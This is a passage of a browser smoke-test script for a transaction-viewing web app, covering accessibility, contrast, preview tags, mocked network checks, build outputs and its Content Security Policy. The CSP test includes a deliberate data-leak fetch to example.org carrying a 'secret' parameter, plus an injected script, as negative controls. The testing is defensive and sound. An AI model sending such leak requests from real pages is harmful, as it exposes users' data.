  check((await active()) === 'txid', `${tag}: Shift+Tab walks back to the id field`, await active())
  await page.keyboard.type(tx(5).id)
  await press('Enter')
  await settled(page)
  s = await snap(page)
  check(s.shownId === tx(5).id, `${tag}: typing an id and pressing Enter shows it`)
  await press('Tab', 4)
  check((await active()) === 'demo', `${tag}: four Tabs (look, summon, open file, demo) reach the demo list`, await active())
  await press('ArrowDown')
  check((await page.evaluate(() => document.getElementById('demo').selectedIndex)) === 1, `${tag}: the arrow key picks the next demo (demo 2, the second one with an audit key)`)
  await press('Tab')
  await armReading(page)
  await armAudit(page)
  await press('Enter')
  await settled(page)
  s = await heard(page)
  check(s.shownId === hero(2).id && s.checkedKey === 'carol' && (await active()) === 'hold', `${tag}: Enter on "Hold the seance" loads demo 2 and focus stays on the button`, await active())
  expectHeard(s, hero(2), 'carol', `${tag}: Carol's key on demo 2`)
  s = await counted(page)
  auditReads(s, hero(2), `${tag}: the audit key on demo 2`)
  await page.focus('input[name=key]:checked')
  await armReading(page)
  await press('ArrowDown')
  s = await heard(page)
  check(s.checkedKey === 'eve', `${tag}: the arrow keys move through the keys (carol to eve)`)
  expectHeard(s, hero(2), 'eve', `${tag}: Eve's key on demo 2 by keyboard`)
  await page.focus('input[name=audit-key]:checked')
  await armAudit(page)
  await press('ArrowUp')
  s = await counted(page)
  check(s.auditChecked === 'eve' && s.auditQuiet === QUIET, `${tag}: the arrow keys move through the Auditor's keys too (audit key to Eve's key: silence)`, `${s.auditChecked}`)
  await armAudit(page)
  await press('ArrowDown')
  s = await counted(page)
  check(s.auditChecked === 'auditor', `${tag}: ArrowDown brings the audit key back`, `${s.auditChecked}`)
  auditReads(s, hero(2), `${tag}: demo 2, the audit key again`)
  await page.focus('#summon')
  await press('Space')
  await settled(page)
  s = await snap(page)
  check(isHex64(s.shownId) && /^Recorded:/.test(s.source) && (await active()) === 'summon', `${tag}: Space on "Summon" works in recorded mode and keeps focus`)
  await page.close()
}

// ---------- reduced motion ----------
async function motionRun(browser) {
  const anim = (page) => page.evaluate(() => ({ flame: getComputedStyle(document.querySelector('.spirit .flame')).animationName, scroll: getComputedStyle(document.documentElement).scrollBehavior }))
  const probeReading = async (page) => {
    await page.select('#demo', tx(1).id)
    await page.click('#hold')
    await settled(page)
    return page.evaluate(() => getComputedStyle(document.querySelector('#reading .reading')).animationName)
  }
  const probeAudit = async (page) => {
    await page.select('#demo', hero(4).id) // 250 + 7,239: counted in a moment, but over many slices
    await armAudit(page)
    await page.click('#hold')
    await settled(page)
    await counted(page)
    return page.evaluate(() => ({ reading: getComputedStyle(document.querySelector('#audit-reading .reading')).animationName, bars: window.__bars.map((b) => b.motion) }))
  }
  const normal = await open(browser, { w: 1280 })
  await normal.page.click('#mode-switch')
  const n1 = await anim(normal.page)
  const n2 = await probeReading(normal.page)
  const n3 = await probeAudit(normal.page)
  check(n1.flame === 'flicker' && n2 === 'rise' && n3.reading === 'rise', 'motion: by default the flame flickers and the readings of the Medium and the Auditor fade in (control)', `${n1.flame}, ${n2}, ${n3.reading}`)
  await normal.page.close()
  const calm = await open(browser, { w: 375, reduce: true })
  await calm.page.click('#mode-switch')
  const c1 = await anim(calm.page)
  const c2 = await probeReading(calm.page)
  const c3 = await probeAudit(calm.page)
  check(c1.flame === 'none' && c2 === 'none' && c3.reading === 'none' && c1.scroll === 'auto', 'motion: with prefers-reduced-motion the flame is still, readings (the Auditor\'s too) do not fade in, scrolling is instant', `${c1.flame}, ${c2}, ${c3.reading}, ${c1.scroll}`)
  check(c3.bars.length > 0 && c3.bars.every((m) => m === 'none/0s'), 'motion: with prefers-reduced-motion the Auditor still shows its progress bar, and nothing about it is animated', `${c3.bars.length} updates: ${[...new Set(c3.bars)].join(' ')}`)
  const y1 = await scrollSettled(calm.page)
  const s = await snap(calm.page)
  check(Math.abs(s.strangerTop) <= 24, 'motion: reduced motion still scrolls to the answer on a phone', `top ${s.strangerTop}px, scrollY ${y1}`)
  await calm.page.close()
}

// ---------- contrast of the palette ----------
function lum(hex) {
  const c = [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16) / 255).map((v) => (v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4))
  return 0.2126 * c[0] + 0.7152 * c[1] + 0.0722 * c[2]
}
const ratio = (a, b) => {
  const [x, y] = [lum(a), lum(b)].sort((p, q) => q - p)
  return (x + 0.05) / (y + 0.05)
}
async function paletteChecks(browser) {
  const { page } = await open(browser, { w: 1280 })
  const v = await page.evaluate(() => Object.fromEntries(['--bg', '--card', '--card-2', '--well', '--text', '--muted', '--violet', '--amber', '--amber-ink', '--mint', '--rose', '--focus', '--control', '--line'].map((n) => [n, getComputedStyle(document.documentElement).getPropertyValue(n).trim()])))
  // axe cannot judge text that sits on the page's radial gradient ("needs review"), so bound it: the gradient is never lighter than its centre colour
  const glow = await page.evaluate(() => getComputedStyle(document.body).backgroundImage.match(/rgb\((\d+), (\d+), (\d+)\)/)?.slice(1).map(Number))
  const peak = glow ? `#${glow.map((n) => n.toString(16).padStart(2, '0')).join('')}` : '#ffffff'
  await page.close()
  const text = [
    ['--text', '--bg'], ['--text', '--card'], ['--text', '--card-2'], ['--text', '--well'],
    ['--muted', '--bg'], ['--muted', '--card'], ['--muted', '--card-2'], ['--muted', '--well'],
    ['--violet', '--bg'], ['--violet', '--card'], ['--violet', '--card-2'],
    ['--amber', '--bg'], ['--amber', '--card'], ['--amber', '--card-2'], ['--amber-ink', '--amber'], ['--amber-ink', '#ffc477'],
    ['--rose', '--card'], ['--rose', '--bg'], ['--mint', '--card'], ['--mint', '#12332a'], ['--amber', '#3a2a10'], ['--violet', '#2a2250'],
    ['#9a92b4', '--well'], ['#e4defa', '--well'],
    ['--text', peak], ['--muted', peak], ['--violet', peak], // hero, section headings, the Auditor card and the footer sit on the bare page
  ]
  const val = (x) => (x.startsWith('#') ? x : v[x])
  const weak = text.map(([f, b]) => [f, b, ratio(val(f), val(b))]).filter(([, , r]) => r < 4.5)
  check(weak.length === 0, `contrast: all ${text.length} text/background pairs in the palette reach 4.5:1`, weak.map(([f, b, r]) => `${f} on ${b} ${r.toFixed(2)}`).join('; ') || `lowest ${Math.min(...text.map(([f, b]) => ratio(val(f), val(b)))).toFixed(2)}:1`)
  const ui = [['--focus', '--bg'], ['--focus', '--card'], ['--focus', '--well'], ['--control', '--card'], ['--control', '--well'], ['--control', '--bg']]
  const weakUi = ui.filter(([f]) => v[f]).map(([f, b]) => [f, b, ratio(val(f), val(b))]).filter(([, , r]) => r < 3)
  check(v['--control'] !== '' && weakUi.length === 0, 'contrast: focus ring and the borders of fields, selects, buttons and key choices reach 3:1', weakUi.map(([f, b, r]) => `${f} on ${b} ${r.toFixed(2)}`).join('; ') || `--control ${v['--control']}`)
}

// ---------- the policy ----------
async function cspRun(browser) {
  const { page, log } = await open(browser, { w: 1280 })
  const meta = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? '')
  const quiet = await cspSeen(page, log) // read before the controls below break the policy on purpose
  check(meta === CSP, "csp: the policy is v1's, word for word: v2 adds no directive and no source (no 'self' in connect-src)", meta)
  check(quiet.length === 0, 'csp: loading the page and drawing the first answer caused 0 violations', quiet.slice(0, 2).join(' | '))
  const dirs = Object.fromEntries(meta.split(/;\s*/).filter(Boolean).map((d) => { const [k, ...rest] = d.trim().split(/\s+/); return [k, rest.join(' ')] }))
  check(dirs['connect-src'] === INDEXER_URL && dirs['default-src'] === "'none'" && dirs['script-src'] === "'self' 'wasm-unsafe-eval'", 'csp: the policy is in the page; connect-src allows only the indexer; default is none', meta)
  check(!/unsafe-inline|unsafe-eval|\*|data:|blob:/.test(meta.replace("'wasm-unsafe-eval'", '')), 'csp: no unsafe-inline, plain unsafe-eval, wildcard, data: or blob:')
  const r = await page.evaluate(async () => {
    const violations = []
    document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.violatedDirective} ${e.blockedURI}`))
    let outside
    try {
      await fetch('https://example.org/leak?k=secret', { mode: 'no-cors' })
      outside = 'allowed'
    } catch (e) {
      outside = `blocked (${e.name})`
    }
    const s = document.createElement('script')
    s.textContent = 'window.__injected = 1'
    document.head.append(s)
    const img = new Image()
    img.src = 'https://example.org/pixel.png'
    await new Promise((ok) => setTimeout(ok, 400))
    return { outside, injected: window.__injected === 1, violations }
  })
  // page.evaluate runs over the debugging protocol, which lets eval through by default; ask for the page's own policy to apply
  const cdp = await page.createCDPSession()
  const ev = await cdp.send('Runtime.evaluate', { expression: "eval('1+1')", allowUnsafeEvalBlockedByCSP: false })
  const evaled = ev.exceptionDetails ? `blocked (${(ev.exceptionDetails.exception?.description ?? ev.exceptionDetails.text).split('\n')[0].slice(0, 60)})` : `allowed ${ev.result.value}`
  check(r.outside.startsWith('blocked') && evaled.startsWith('blocked') && !r.injected, 'csp: negative controls are blocked by the browser: a fetch to another site, eval, an injected inline script', `${r.outside}; ${evaled}; injected=${r.injected}`)
  check(['connect-src', 'script-src', 'img-src'].every((d) => r.violations.some((x) => x.startsWith(d))), 'csp: the browser reported violations for each of them', r.violations.join(' | '))
  await page.close()
}

// ---------- the link preview ----------
// Served under /seance-v2/ like the real site: the tags parse in the browser, they name the public address, and og.png is where they say it is.
async function previewRun(browser) {
  const { page } = await open(browser, { w: 1280 })
  const tags = await page.evaluate(() => Object.fromEntries([...document.querySelectorAll('meta[property^="og:"], meta[name="twitter:card"]')].map((m) => [m.getAttribute('property') ?? m.getAttribute('name'), m.content])))
  await page.close()
  const need = ['og:type', 'og:url', 'og:title', 'og:description', 'og:image', 'twitter:card']
  check(need.every((k) => tags[k]) && tags['twitter:card'] === 'summary_large_image' && tags['og:type'] === 'website', 'preview: og:type, og:url, og:title, og:description, og:image and twitter:card (summary_large_image) are set', JSON.stringify(Object.keys(tags)))
  check(tags['og:url'] === PUBLIC_URL && tags['og:image'] === `${PUBLIC_URL}og.png`, 'preview: og:url and og:image are absolute and name the public address', `${tags['og:url']} ${tags['og:image']}`)
  check(tags['og:description'].length <= 300, 'preview: og:description is short enough to show whole', String(tags['og:description'].length))
  const res = await fetch(`${BASE}og.png`) // the same path under the served prefix as the public address uses
  const png = Buffer.from(await res.arrayBuffer())
  check(res.status === 200 && png.subarray(1, 4).toString() === 'PNG' && png.readUInt32BE(16) === 1200 && png.readUInt32BE(20) === 630, 'preview: /seance-v2/og.png is served and is a 1200 x 630 PNG', `${res.status} ${png.readUInt32BE(16)}x${png.readUInt32BE(20)}`)
  check(png.length <= 300 * 1024, 'preview: og.png is at most 300 KB', `${png.length} bytes`)
}

// ---------- the connection check (README "Check my connection"), and what a lookup of a listed id sends ----------
// The indexer and Cloudflare's trace answer are both mocked here. The answer is a fixture with a documentation IP address and an invented place name, so that the run can look for
// both on the page and in the browser; no real answer is fetched by this file, and no check below prints a fixture value.
const FIX = { ip: '203.0.113.77', loc: 'Zzyzx-Test-Province-Of-Nowhere', uag: 'Fixture/1.0', ts: '1700000000.123' }
const fixtureTrace = (kex) => ['fl=00f000', 'h=esme-indexer-a.ootle.tari.com', `ip=${FIX.ip}`, `ts=${FIX.ts}`, 'visit_scheme=https', `uag=${FIX.uag}`, 'colo=XXX', 'http=http/2', `loc=${FIX.loc}`, 'tls=TLSv1.3', 'sni=plaintext', ...(kex === null ? [] : [`kex=${kex}`])].join('\n') + '\n'
const KEX_HYBRID_START = "Your browser's connection to the indexer's front door (Cloudflare) used X25519MLKEM768: X25519 combined with ML-KEM-768."
const KEX_HYBRID_END = 'This covers only that connection. It does not change what the chain makes public, and it does not cover the link from Cloudflare to the indexer.'
const KEX_CLASSICAL = (group) => `Your browser used a classical key exchange (${group}) for this connection.`
const KEX_UNKNOWN = 'Cloudflare did not say which key exchange this connection used.'

// The indexer as the lookups see it: the two listed transactions, a 404 for any id, and Cloudflare's trace (`state.gate`, when set, holds the answer back).
function mockIndexer() {
  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' }
  const state = { kex: 'X25519MLKEM768', gate: null, asked: [], lists: 0, traces: 0 }
  const intercept = (r) => {
    const u = new URL(r.url())
    if (u.host !== INDEXER_HOST) return void (u.host === OWN ? r.continue() : r.abort())
    if (r.method() === 'OPTIONS') return void r.respond({ status: 204, headers: cors })
    if (u.pathname === TRACE_PATH) {
      state.traces++
      const answer = () => r.respond({ status: 200, headers: cors, contentType: 'text/plain', body: fixtureTrace(state.kex) })
      return void (state.gate ? state.gate.then(answer) : answer())
    }
    if (u.pathname === '/transactions/recent') {
      state.lists++
      return void r.respond({ status: 200, headers: cors, contentType: 'application/json', body: JSON.stringify({ transactions: ledger.recent.transactions }) })
    }
    const id = u.pathname.split('/').pop()
    state.asked.push(id)
    return void r.respond({ status: 404, headers: cors, contentType: 'application/json', body: JSON.stringify({ error: `Transaction ${id} is not known to this indexer` }) })
  }
  return { state, intercept }
}
const lookUp = async (page, id) => {
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(id)
  await page.click('#look')
  await settled(page)
  return snap(page)
}
const namedInHead = (head) => /; (\d+) named a transaction id; your keys were in none of them\.$/.exec(head)?.[1] ?? null

// research/79 S3: two different ids that are both in the list the page downloads cause the very same requests, so the indexer cannot tell which of the listed ones was read;
// K is 0 until "Ask for it anyway" is pressed, and 1 after. The browser's own requests are left out of both lists (the background refresh of its saved list, see refresh above, and the icon): they are not the page's and come in one run and not the other.
async function lookupPatternRun(browser) {
  const tag = 'looking up a listed id'
  const ids = ledger.recent.transactions.slice(0, 2).map((t) => t.transaction_id)
  const runs = []
  const icon = /\/favicon\.svg$/ // the browser fetches the page's icon on its own and keeps it for the next page it opens, so it is listed in one run only
  for (const id of ids) {
    const m = mockIndexer()
    const { page, log } = await open(browser, { w: 1280, intercept: m.intercept })
    const s = await lookUp(page, id)
    runs.push({ id, s, asked: m.state.asked.length, lists: m.state.lists, requests: made(log).filter((r) => !icon.test(r.url)).map((r) => `${r.method} ${r.url}`), rows: s.netRows.filter((r) => !(r.cells[2] === INDEXER_HOST && r.cells[4] === 'unknown') && !icon.test(r.cells[3])).map((r) => r.cells.slice(2).join(' | ')), named: named(log) })
    await page.close()
  }
  const [a, b] = runs
  check(ids.length === 2 && ids[0] !== ids[1] && runs.every((r) => r.s.shownId === r.id && LISTED.test(r.s.source ?? '') && r.asked === 0 && r.lists === 1), `${tag}: two different ids from the list are each read from it: one request for the list, none by id`, runs.map((r) => `${r.lists} list, ${r.asked} by id, ${r.s.source}`).join(' | '))
  check(a.requests.length > 1 && JSON.stringify(a.requests) === JSON.stringify(b.requests) && !a.requests.concat(b.requests).some((u) => ids.some((id) => u.includes(id))), `${tag}: the two lookups cause identical request lists (${a.requests.length} requests, same methods and addresses), and no request names either id`, `${a.requests.length} and ${b.requests.length} requests; in one run only: ${[...a.requests.filter((u) => !b.requests.includes(u)), ...b.requests.filter((u) => !a.requests.includes(u))].map((u) => u.replace(/[0-9a-f]{64}/g, '<64 hex>')).join(' ; ')}`)
  check(a.rows.length > 0 && JSON.stringify(a.rows) === JSON.stringify(b.rows), `${tag}: the ghost log lists the same rows for both (${a.rows.length} rows, compared without the row number and the time)`, `${a.rows.length} and ${b.rows.length} rows; in one run only: ${[...a.rows.filter((x) => !b.rows.includes(x)), ...b.rows.filter((x) => !a.rows.includes(x))].join(' ;; ')}`)
  check(runs.every((r) => namedInHead(r.s.netHead) === '0' && r.named === 0), `${tag}: K is 0 in the headline for both`, runs.map((r) => r.s.netHead).join(' | '))

  const m = mockIndexer()
  const { page, log } = await open(browser, { w: 1280, intercept: m.intercept })
  let s = await lookUp(page, UNKNOWN)
  check(s.ask && NOT_LISTED.test(s.status) && m.state.asked.length === 0 && namedInHead(s.netHead) === '0' && named(log) === 0, `${tag}: an id the list does not hold, before "Ask for it anyway": nothing asked by id, K is 0`, `${m.state.asked.length} by id | ${s.netHead}`)
  await page.click('#ask-anyway')
  await settled(page)
  s = await snap(page)
  check(m.state.asked.length === 1 && m.state.asked[0] === UNKNOWN && namedInHead(s.netHead) === '1' && named(log) === 1, `${tag}: after "Ask for it anyway", the id is asked once, and K is 1`, `${m.state.asked.length} by id | ${s.netHead}`)
  await netlogChecks(page, log, `${tag}, after the id was asked`)
  await page.close()
}

async function connectionRun(browser, w) {
  const tag = `the connection check (${w}px)`
  const wide = w >= 960
  const m = mockIndexer()
  let release
  m.state.gate = new Promise((ok) => (release = ok)) // the first answer is held back until the button has been pressed twice
  const { page, log } = await open(browser, { w, intercept: m.intercept })
  const out = () => page.evaluate(() => document.getElementById('check-out').textContent)
  const idle = () => until(page, () => !document.getElementById('check-conn').hasAttribute('aria-disabled') && !/^Sending/.test(document.getElementById('check-out').textContent), undefined, 10000)
  const traces = () => log.requests.filter((r) => new URL(r.url).pathname === TRACE_PATH)
  let s = await snap(page)
  const rows0 = s.netRows.length
  const k0 = namedInHead(s.netHead)
  const button = await page.evaluate(() => {
    const b = document.getElementById('check-conn')
    return { text: b.textContent, shipped: b.hasAttribute('aria-disabled'), hint: b.parentElement.querySelector('.hint')?.textContent ?? '', live: document.getElementById('check-out').getAttribute('role') }
  })
  check(button.text === 'Check my connection' && !button.shipped && /sends one request/.test(button.hint) && button.live === 'status' && (await out()) === '' && traces().length === 0 && m.state.traces === 0, `${tag}: the button says it sends one request, and nothing is sent or shown until it is pressed`, `${button.text} | ${traces().length} trace requests`)

  // pressed twice while the first answer is awaited: one request
  await page.click('#check-conn')
  await page.click('#check-conn')
  await sleep(300)
  const waiting = await page.evaluate(() => ({ busy: document.getElementById('check-conn').getAttribute('aria-disabled'), text: document.getElementById('check-out').textContent }))
  check(m.state.traces === 1 && waiting.busy === 'true' && waiting.text === 'Sending one request…', `${tag}: pressed twice while the answer is awaited, it sends one request and says so`, `${m.state.traces} requests | ${waiting.text}`)
  release()
  await idle()
  const first = await out()
  check(first.startsWith(KEX_HYBRID_START) && first.endsWith(KEX_HYBRID_END) && first.includes("NIST's quantum-resistant key-establishment standard") && !/classical/i.test(first), `${tag}: kex=X25519MLKEM768 shows the post-quantum sentence with the limit on what it covers`, first.slice(0, 60))
  await layout(page, `${tag}, the answer showing`, { wide })
  await axe(page, `${tag}, the answer showing`)

  // the other answers Cloudflare can give, one press each
  const bad = []
  let n = 1
  for (const [kex, want] of [['X25519', KEX_CLASSICAL('X25519')], ['P-256', KEX_CLASSICAL('P-256')], [null, KEX_UNKNOWN], ['junk;value<>', KEX_UNKNOWN], ['X25519Kyber768Draft00', KEX_UNKNOWN]]) {
    m.state.kex = kex
    await page.click('#check-conn')
    await idle()
    n++
    s = await snap(page)
    for (let i = 0; i < 40 && s.netRows.some((r) => r.cells[6] === 'waiting'); i++) {
      await sleep(100)
      s = await snap(page)
    }
    const shown = await out()
    if (shown !== want) bad.push(`kex ${kex === null ? 'missing' : kex.slice(0, 12)}: ${shown.slice(0, 50)}`)
    if (m.state.traces !== n || s.netRows.length !== rows0 + n || namedInHead(s.netHead) !== k0) bad.push(`after press ${n}: ${m.state.traces} requests, ${s.netRows.length - rows0} new rows, K ${namedInHead(s.netHead)}`)
  }
  check(bad.length === 0, `${tag}: X25519 and P-256 are called classical with their name; a missing line, a junk value and another hybrid's name are "did not say" (never "classical"); each press adds one request and one row, and K stays ${k0}`, bad.join(' | '))
  check(traces().length === n && traces().every((r) => r.method === 'GET' && r.type === 'fetch') && !traces().some((r) => 'cookie' in JSON.parse(r.headers)), `${tag}: ${n} presses made ${n} requests, each a plain GET (no preflight, no cookie)`, traces().map((r) => `${r.method} ${r.type}`).join(', '))

  // the fixture's IP address and place are in none of the places a page could keep them
  const secrets = Object.values(FIX)
  const kept = await page.evaluate((secrets) => {
    const where = { page: document.documentElement.outerHTML + document.body.innerText, storage: JSON.stringify(localStorage) + JSON.stringify(sessionStorage), cookie: document.cookie, title: document.title, address: location.href, history: JSON.stringify(history.state), timing: JSON.stringify(performance.getEntriesByType('resource').map((e) => e.name)) }
    return Object.entries(where).filter(([, v]) => secrets.some((x) => v.includes(x))).map(([k]) => k)
  }, secrets)
  const logged = log.console.some((c) => secrets.some((x) => c.text.includes(x))) || log.pageErrors.some((e) => secrets.some((x) => e.includes(x))) || log.requests.some((r) => secrets.some((x) => r.url.includes(x) || r.headers.includes(x)))
  check(kept.length === 0 && !logged, `${tag}: the answer's IP address, place, browser name and time are not in the page, storage, cookies, title, address, history, the console or any request (${secrets.length} values searched)`, kept.length || logged ? `found in: ${kept.join(', ')}${logged ? ' console/requests' : ''}` : '')
  const csp = await cspSeen(page, log)
  check(csp.length === 0 && log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: 0 Content Security Policy violations, no page error, no console error`, csp.concat(log.pageErrors, consoleBad(log).map((c) => c.text)).slice(0, 2).join(' | '))
  await netlogChecks(page, log, tag)
  await page.close()
}

// ---------- the built files ----------
function staticChecks() {
  const html = readFileSync(join(DIST, 'index.html'), 'utf8')
  const refs = [...html.matchAll(/\b(?:src|href)="([^"]+)"/g)].map((m) => m[1])
  const local = refs.filter((u) => !/^(?:[a-z]+:)?\/\//i.test(u) && !u.startsWith('data:') && !u.startsWith('#'))
  const outside = local.filter((u) => !u.startsWith('/seance-v2/assets/') && u !== './favicon.svg' && u !== './seance-offline.html')
  check(outside.length === 0 && local.filter((u) => u.startsWith('/seance-v2/assets/')).length >= 2, 'build: every asset path starts with /seance-v2/assets/ (the script and the style sheet), the icon is the relative ./favicon.svg, and the link to the offline copy is the relative ./seance-offline.html', outside.join(', ') || local.join(' '))
  check(!/<script(?![^>]*\bsrc=)/i.test(html) && !/\sstyle=/i.test(html), 'build: no inline script or style in index.html')
  check(!existsSync(join(DIST, 'gate.html')) && existsSync(join(DIST, 'THIRD-PARTY-LICENSES.md')) && existsSync(join(DIST, 'favicon.svg')), 'build: no gate page shipped; third-party licence notices and favicon are')
  // Hosts the page may name: the indexer (the only one it contacts: the CSP allows nothing else), and links a visitor can click: the explorer, ootle.tari.com, the second
  // public indexer (receipts of saved copies), GitHub and raw.githubusercontent.com (the template, the saved ledger). The last two are the SVG namespace and the preview tags.
  // The recording's own `indexer` field names where it was taken from: recorded data, kept as it was, and never contacted.
  const allowed = new Set([INDEXER_HOST, new URL(EXPLORER_URL).host, 'ootle.tari.com', new URL(MIRROR_URL).host, 'github.com', new URL(LEDGER_URL).host, 'www.w3.org', new URL(PUBLIC_URL).host, new URL(ledger.indexer).host])
  const found = new Map()
  // The notices (.md) and the pictures and videos are not pages: the demo video's encoder string names videolan.org.
  const walkDir = (d) => {
    for (const n of readdirSync(d)) {
      const p = join(d, n)
      if (statSync(p).isDirectory()) walkDir(p)
      else if (!/\.(md|mp4|png)$/.test(n)) for (const m of readFileSync(p, 'utf8').matchAll(/(?:https?:)?\/\/([a-z0-9][a-z0-9.-]*\.[a-z]{2,})/gi)) found.set(m[1].toLowerCase(), n)
    }
  }
  walkDir(DIST)
  const stray = [...found.keys()].filter((h) => !allowed.has(h))
  check(stray.length === 0, `build: every host named in the built files is expected (${[...found.keys()].join(', ')}); the w3.org one is the SVG namespace in the favicon, the github.io one is this site's own address in the preview tags`, stray.join(', '))
}

// ---------- main ----------
mkdirSync(EVID, { recursive: true })
if (!existsSync(join(DIST, 'index.html'))) throw new Error('dist/ is missing: run npm run build first')
const server = await serveDir(DIST, PORT, '/seance-v2/')
const profile = (tag) => mkdtempSync(join(tmpdir(), `seance-smoke-${tag}-`))
const dirs = [profile('live'), profile('offline')]
const launch = (dir, extra = []) => puppeteer.launch({ executablePath: process.env.CHROMIUM ?? '/usr/bin/chromium', headless: true, userDataDir: dir, args: ['--no-sandbox', '--disable-dev-shm-usage', ...extra] })
const online = await launch(dirs[0])
// every host except this machine fails to resolve: the indexer is unreachable and nothing outside can be contacted
const offline = await launch(dirs[1], ['--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1'])
// SMOKE_ONLY=forgotten,loading runs just the scenarios whose names start so (a quick look while working); such a run writes no evidence/smoke.txt
const only = process.env.SMOKE_ONLY?.split(',')
const scenario = async (name, fn) => {
  if (only && !only.some((p) => name.startsWith(p))) return
  try {
    await fn()
  } catch (e) {
    failed++
    say(`FAIL scenario "${name}" crashed  [${e?.stack?.split('\n').slice(0, 3).join(' | ') ?? e}]`)
  }
}

say(`Seance smoke test of dist/ at ${BASE}, ${new Date().toISOString()}, ${await online.version()}`)
try {
  section('the built files')
  staticChecks()
  await scenario('preview', () => previewRun(online))
  section('the block works (control for the recorded runs)')
  await scenario('block control', async () => {
    const p = await offline.newPage()
    const err = await p.goto(`${EXPLORER_URL}/`, { timeout: 15000 }).then(() => 'loaded', (e) => String(e.message).split(' at ')[0])
    check(err === 'net::ERR_NAME_NOT_RESOLVED', 'the offline browser cannot reach the explorer (so a page that works there needs no outside host)', err)
    await p.close()
  })
  section('palette contrast')
  await scenario('palette', () => paletteChecks(online))
  section('judge path, live indexer')
  for (const w of [1280, 375]) await scenario(`live ${w}`, () => walk(online, { mode: 'live', w }))
  section('judge path, recorded (fixture) mode, no network')
  for (const w of [1280, 375]) await scenario(`recorded ${w}`, () => walk(offline, { mode: 'recorded', w }))
  section('the indexer goes away')
  for (const w of [1280, 375]) await scenario(`fallback ${w}`, () => fallbackRun(offline, w))
  await scenario('fallback from the list', () => fallbackListRun(offline))
  await scenario('hang', () => hangRun(online))
  section('the indexer forgot a demo (mocked: it answers 404 to all but one)')
  for (const w of [1280, 375]) await scenario(`forgotten ${w}`, () => forgottenRun(online, w))
  section('a quiet chain (mocked: the list holds no private transfer, so Summon falls back to the recorded sample)')
  await scenario('quiet chain', () => quietRun(online))
  section('the connection check and what a lookup of a listed id sends (mocked indexer and a fixture answer for Cloudflare; no real request)')
  await scenario('lookup pattern', () => lookupPatternRun(offline))
  for (const w of [1280, 375]) await scenario(`connection check ${w}`, () => connectionRun(offline, w))
  section('a transaction opened from a saved file (no network at all from the moment the file is chosen)')
  for (const w of [1280, 375]) await scenario(`file ${w}`, () => fileRun(offline, w))
  await scenario('uppercase link', () => hashRun(offline))
  section('the offline copy: one file that cannot make page requests (opened from disk, then served like Pages)')
  for (const w of [1280, 375]) await scenario(`offline copy ${w}`, () => offlineCopyRun(offline, w))
  await scenario('offline copy served', () => offlineServedRun(offline))
  await scenario('loading', () => loadingRun(offline))
  section('keyboard, reduced motion, a slow phone, policy')
  await scenario('keyboard', () => keyboardRun(offline))
  await scenario('motion', () => motionRun(offline))
  await scenario('slow auditor', () => slowRun(offline))
  await scenario('csp', () => cspRun(online))
} finally {
  await online.close()
  await offline.close()
  for (const d of dirs) rmSync(d, { recursive: true, force: true })
  server.closeAllConnections?.()
  server.close()
}
say(failed === 0 ? '\nRESULT: PASS' : `\nRESULT: FAIL (${failed})`)
if (!only) writeFileSync(join(EVID, 'smoke.txt'), lines.join('\n') + '\n')
process.exit(failed === 0 ? 0 : 1)
